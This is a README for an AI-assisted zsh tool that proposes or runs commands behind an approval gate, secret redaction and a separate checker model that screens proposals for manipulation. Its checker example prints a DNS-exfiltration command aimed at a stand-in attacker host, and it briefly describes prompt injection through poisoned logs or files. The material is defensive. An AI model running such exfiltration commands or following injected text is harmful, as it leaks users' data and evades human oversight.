# ush, the you shell

ush brings wish's `//` paradigm to zsh on your own machine. Ask in plain language.
ush proposes the Unix command that answers it and puts it on your command line; you run
it, and `//` continues with its output: the next command, or the answer. ush itself runs
nothing, unless you ask for agent mode (`--run`), where it investigates on its own.

This directory, `ushpy/`, is the Python implementation of `ush`: the experimental one, where
features are tried first. The Go implementation in [ushgo/](../ushgo/README.md) is the same command
and will be the one releases ship; both must behave the same
([SDLC](../docs/SDLC.md#ush-one-command-two-implementations)).

```console
$ // find out why my disk is full and visual tools don't seem to get anywhere
ush · claude-opus-5-5 · proposes, you run · requests and command output go to Anthropic, secrets redacted
First the volumes and local Time Machine snapshots, which Finder doesn't count.
→ df -h / /System/Volumes/Data && tmutil listlocalsnapshots /   # free space, snapshots
on your command line: Enter runs it, or edit it first · then // continues
$ df -h / /System/Volumes/Data && tmutil listlocalsnapshots /
...
$ //
9 GB free of 460 GB, and no local snapshots. Next, the largest folders in Library.
→ du -xsh ~/Library/* 2>/dev/null | sort -h | tail -8   # largest folders in Library
$ du -xsh ~/Library/* 2>/dev/null | sort -h | tail -8
...
$ //
Most of the space is in ~/Library/Developer (≈71 GB): Xcode's DerivedData and old simulators ...
```

The transcript above is illustrative; actual commands and answers depend on the
machine and the model.

## How it works

- **ush proposes, you run.** `// REQUEST` gets one proposed command, which the zsh plugin
  puts on your command line. Enter runs it in your shell (edit it first if you like);
  the plugin records the exit status and output, and `//` continues: ush proposes the
  next command or answers. Changes, commands ush can't verify as read-only, and the
  checker's objections are marked in yellow. Without the plugin, ush prints the proposal.
- **Agent mode** (`ush --run //REQUEST`, or `mode: run`): ush runs the commands itself,
  answers, and offers follow-ups. `ush` alone starts a session, where `// TEXT` asks and
  any other line runs as an ordinary command whose output becomes context. The rest of
  this list is about agent mode.
- **Read-only commands run immediately.** ush has its own policy for command
  lines. It recognizes known read-only invocations such as `df`, `du`, `ls`,
  `find` without `-delete`/`-exec`, `diskutil list`, `tmutil listlocalsnapshots`,
  `docker system df`, and `log show`.
- **Everything else needs your approval:** deletions, writes, redirections,
  `sudo`, unknown commands, scripts, and commands that read secret files (e.g.
  `~/.ssh`, keychains, `.env`). ush shows the command and the reason; you answer
  `y`, `n` (optionally with a reason for the assistant), `e` to edit, or `a` to abort.
  The assistant's own claim that a command is read-only never bypasses this check.
- **Your allowlist:** `ush allow add kubectl get` lets commands ush doesn't know run
  without approval when they start with those words (`kubectl get pods -A`). Rules
  extend ush's table and never widen it: they can't name commands it already checks
  (`find`, `sed`), commands that run other commands (`sh`, `env`, `xargs`, `python`),
  or commands that change or send data (`rm`, `curl`). Shell syntax, redirections,
  secret files, a command the assistant marks as a change, `--confirm`, and the
  checker still ask. Under `sudo`, rules are not used.
- **Interpretation:** the model sees exit status and bounded output (secrets
  redacted), then explains the finding, key numbers, and next steps.
- **Replay without AI:** `ush history` lists requests and the commands they ran;
  `ush replay ID` runs those commands again through the same approval checks.

## Install

ush needs zsh, Python 3.10 or newer, and an Anthropic API key.

```sh
cd ushpy
./install.sh                     # installs ~/.local/bin/ush
ush ai configure                 # key goes to the macOS keychain (or a 0600 file)
```

The installer offers to add the zsh plugin to `~/.zshrc`, which puts proposals on your
command line (Esc removes one) and lets requests go unquoted. Or add it yourself:

```sh
source ~/.local/share/ush/ush.plugin.zsh
```

Without the plugin, quote requests: `ush '//why is my disk full?'`. Otherwise zsh
would interpret `'` and `?`. With the plugin, `ush //...`, `sudo ush //...`, and a
bare `// ...` line are passed verbatim. Set `USH_BARE_SLASH=0` before sourcing to
disable the bare `//` form.

### Using sudo

`sudo ush //...` runs commands as root. ush still uses the invoking user's key and
settings (via `SUDO_USER`), writes history to root's state directory, and ignores
endpoint overrides from the environment. Root runs whatever ush files it is given,
so for sudo use install a root-owned copy:

```sh
sudo ./install.sh --prefix /usr/local     # /usr/local/bin/ush, /usr/local/lib/ush
```

Under sudo, the macOS keychain of the invoking user may be unavailable. If ush
reports no key, store it in a file instead: `ush ai configure --file`.
Alternatively, run ush without sudo: commands the assistant prefixes with `sudo` are
shown for approval and then ask for your password as usual.

### Local models with Ollama

ush can use a model running in [Ollama](https://ollama.com) on the same machine instead
of Anthropic. Requests and command output then stay on this machine, and no key is needed.

```sh
ollama pull qwen3:8b              # any pulled model that supports tools
ush ai configure                  # provider: ollama, then URL and model
ush //why is my disk full?
```

For one run, `USH_PROVIDER=ollama USH_MODEL=qwen3:8b ush //...` works too (not under
sudo, where only the settings file counts). The Ollama URL must be on this machine
(`127.0.0.1`, `localhost`, or `::1`); ush refuses anything else. Ollama forwards
*cloud* models (e.g. `gemma4:31b-cloud`) to ollama.com; ush then says so before each
request instead of "stay on this machine".

Small models (3B and below) often answer without running commands or emit tool calls
as text. Use a model with reliable tool calling, and give Ollama enough context for
command output, e.g. `OLLAMA_CONTEXT_LENGTH=32768 ollama serve`.

### A second opinion: the checker model

A second, independent model can check each command or script the assistant proposes before it
runs. It sees only what you asked and the proposal, never command output, piped input, or the
assistant's reasoning, so text that manipulated the assistant (a poisoned log line, a README)
can't talk to it. It answers OK or flags the proposal with a reason:

```sh
ush -k ollama:llama3.2:3b //why is my disk full?     # for one run; or `ush ai configure`
```

```console
$ dig +short aWQ9NTAx.attacker.example   # check DNS
  checker llama3.2:3b: flagged: looks up a name that carries encoded data
  needs approval: the checker flagged it: looks up a name that carries encoded data
  run it? [y]es / [n]o / [e]dit / [a]bort:
```

The checker only adds friction: what it flags needs your approval even if ush would run it
unasked, and if it can't answer (Ollama stopped, an unclear reply), ush asks too. It never
approves anything. A small local model is enough, but not a tiny one; see `.env.template` for
what was measured. `ush replay` runs no checker, as it uses no AI.

## Commands and options

```text
ush [OPTIONS] //REQUEST...   propose a command for your command line, or answer
ush [OPTIONS] //             continue with what you ran
ush explain COMMAND...       explain a command line with the model (Down on a proposal)
ush [OPTIONS]                start a session
ush ai configure [--file]    set the mode, provider, API key or Ollama URL, model, and effort
ush ai status                show provider, model, key source, and paths
ush ai clear-key             remove the stored API key
ush allow [add|remove RULE]  list, add, or remove commands that may run without approval
ush history [-n N]           list recent requests and the commands they ran
ush replay ID|last [-n]      run those commands again, without AI

-r, --run       agent mode: ush runs the commands     -N, --new      start a new conversation
-n, --dry-run   show what would run, run nothing     -c, --confirm  approve every command
-1, --once      no follow-up questions               -v, --verbose  show complete output
-m, --model M   model for this run                   -e, --effort L low … max
-k, --checker M checker for this run (claude-haiku-5-5, llama3.2:3b, off)
```

Piped input becomes context: `dmesg | tail -50 | ush //explain these errors`.
Without a terminal (cron, CI), propose mode prints the proposal; agent mode cannot ask
for approval, so it runs read-only commands only and declines the rest.

Settings live in `~/.config/ush/config.json` (`mode`, `provider`, `model`, `effort`,
`ollama_url`, `ollama_model`, `checker`, `allow`, `max_steps`, `command_timeout`, `max_timeout`,
`output_limit`, `show_lines`). The default model
is `claude-opus-5-5` with effort `medium`. Refusals fall back server-side to a
model Anthropic selects (`fallbacks: "default"`).

## What leaves your machine

With Anthropic, each request sends your text, the OS name, your user name, and the
working directory to Anthropic. With a local Ollama model the same data goes only to
Ollama on this machine; with an Ollama cloud model, Ollama forwards it to ollama.com. It also sends the output of every command that runs, up to 32 KB each (in propose mode, of
each proposal you run), plus any piped input. A checker model gets your requests and the proposed commands, but no
output; ush names where it runs before the first request. Before sending, ush redacts known token formats, private key
blocks, URL credentials, `password=`-style assignments, and your API key.
Redaction is pattern-based and cannot catch everything: assume that what a command
prints may reach the provider. Use `--confirm` to see each command before it runs.

History (`~/.local/state/ush/history.jsonl`, mode 0600) stores requests, commands,
decisions, exit codes, and a shortened, redacted answer, but no command output. In
propose mode the conversation, with the redacted output sent, is kept for an hour in
`~/.local/state/ush/sessions/` (mode 0600) so that `//` can continue it.
The API key is never passed to commands; `ANTHROPIC_*` variables are removed from
their environment.

## Limitations

- The read-only policy is a convenience gate, not a sandbox. It judges command lines by
  name and arguments; a "read-only" tool with an unknown side effect would run
  without asking. See [SEC.md](docs/SEC.md) for the threat model.
- Interactive and full-screen programs (`vim`, `top` without `-l`) don't work
  inside ush; leave ush to use them.
- Starting ush takes about two seconds while the Anthropic SDK loads. Follow-ups
  in a session don't pay this again.
- Providers: Anthropic, and Ollama on the same machine (through Ollama's
  Anthropic-compatible API). Other providers are not implemented.
- The checker is a second opinion from a model, not a guarantee: small models miss attacks and
  raise false alarms. It can only make ush ask more, never less.
- ush does not filter escape sequences in commands and their output yet, so a crafted
  command can look different in the approval prompt; see
  [SECTEST.md](docs/SECTEST.md) (F1, TODO 2.9).

## Guides

The [user guide](docs/USER.md) covers asking, approving, the allowlist, the checker, and
troubleshooting; the [admin guide](docs/ADMIN.md) covers installing (also root-owned for `sudo`),
settings and files, the network, upgrades, and removal. The same guides are in `ushgo/docs/`; the
sections about the command are identical in both (checked by `test_docs`).

## Smoke test

To check an installed `ush` (either implementation) on your machine, run
`scripts/smoke.sh`: offline first, then `--provider ollama --model …` on a local model. It keeps
your settings and history out and writes a report. [SMOKE.md](docs/SMOKE.md) has the checks and the
manual steps that need a terminal, sudo, or the plugin.

## Development

```sh
just ushpy-test      # from the repository root; or scripts/test.sh
```

The tests use fake providers, a local mock of the Messages API driven through the
real SDK, temporary directories, and a pseudo-terminal for the zsh plugin and the
approval prompt. They never call a paid provider. Design notes are in
[ARCH.md](docs/ARCH.md), the security model in [SEC.md](docs/SEC.md), the security
test plan in [SECTEST.md](docs/SECTEST.md), the plan in [TODO.md](docs/TODO.md) and
[ROAD.md](docs/ROAD.md), open questions in [GAPS.md](docs/GAPS.md), and the progress log in
[DONE.md](docs/DONE.md).

From the repository root, `just ush '//…'` runs ush from the source tree with the
variables in `.env` (see [.env.template](../.env.template)); variables already set in
the shell win.
